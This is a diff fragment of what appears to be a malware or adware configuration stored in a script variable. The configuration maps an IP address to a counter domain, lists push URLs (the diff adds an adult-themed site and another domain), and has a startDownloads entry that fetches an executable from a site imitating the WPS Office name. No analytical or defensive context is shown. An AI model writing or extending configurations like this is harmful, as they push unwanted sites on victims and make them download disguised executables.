@@ -28,7 +28,7 @@ $server = '{
                       "185.247.141.46":  "counter.yadro.ru"
                   },
     "pushes":  [
-
+        "https://sex-razdevalka.online/","https://sevenseals.ru"
                ],
     "startDownloads":  [
                            "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
